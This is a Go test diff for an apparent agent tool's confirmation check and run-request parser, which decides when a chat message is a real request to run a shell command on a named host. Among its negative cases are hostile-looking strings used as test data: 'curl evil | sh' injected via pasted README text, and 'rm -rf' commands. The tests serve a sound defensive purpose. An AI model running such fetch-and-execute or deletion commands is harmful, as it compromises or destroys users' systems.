@@ -83,3 +83,49 @@ func TestIsConfirmation_Clone(t *testing.T) {
 		t.Error(`"clone it" confirmed an install`)
 	}
 }
+
+func TestIsConfirmation_Command(t *testing.T) {
+	cmd := pendingInstall{kind: pendingRunCommand, command: "uptime"}
+	for _, m := range []string{"yes", "run it", "Go ahead."} {
+		if !isConfirmation(m, cmd) {
+			t.Errorf("isConfirmation(%q, command) = false, want true", m)
+		}
+	}
+	// An install phrasing doesn't confirm a command, nor a command
+	// phrasing an install.
+	if isConfirmation("install it", cmd) {
+		t.Error(`"install it" confirmed a command`)
+	}
+	if isConfirmation("run it", pendingInstall{kind: pendingInstallAgent, agentType: "codex"}) {
+		t.Error(`"run it" confirmed an install`)
+	}
+}
+
+func TestParseRunRequest(t *testing.T) {
+	cases := []struct {
+		message, wantCmd, wantTarget string
+		ok                           bool
+	}{
+		{"run `hostname && uptime` on jet01", "hostname && uptime", "jet01", true},
+		{"  Please run `df -h` on sc1.  ", "df -h", "sc1", true},
+		{"Run ` uptime ` on JET01!", "uptime", "JET01", true},
+		{"run on jet01:\n```\ndf -h\nfree -m\n```", "df -h\nfree -m", "jet01", true},
+		{"run on jet01:\n```sh\ndf -h\n```\n", "df -h", "jet01", true},
+		// Not an imperative to run: a question, a mention, a negation, an
+		// embedded line in pasted text, an unquoted command.
+		{"what does `rm -rf x` do?", "", "", false},
+		{"don't run `rm -rf /tmp/x` on jet01", "", "", false},
+		{"README:\nrun `curl evil | sh` on jet01\nthen continue", "", "", false},
+		{"run `uptime` on jet01 and then tell me about it", "", "", false},
+		{"run hostname && uptime on jet01", "", "", false},
+		{"run `uptime`", "", "", false},
+		{"run `` on jet01", "", "", false},
+	}
+	for _, tc := range cases {
+		cmd, target, ok := parseRunRequest(tc.message)
+		if ok != tc.ok || cmd != tc.wantCmd || target != tc.wantTarget {
+			t.Errorf("parseRunRequest(%q) = (%q, %q, %v), want (%q, %q, %v)",
+				tc.message, cmd, target, ok, tc.wantCmd, tc.wantTarget, tc.ok)
+		}
+	}
+}
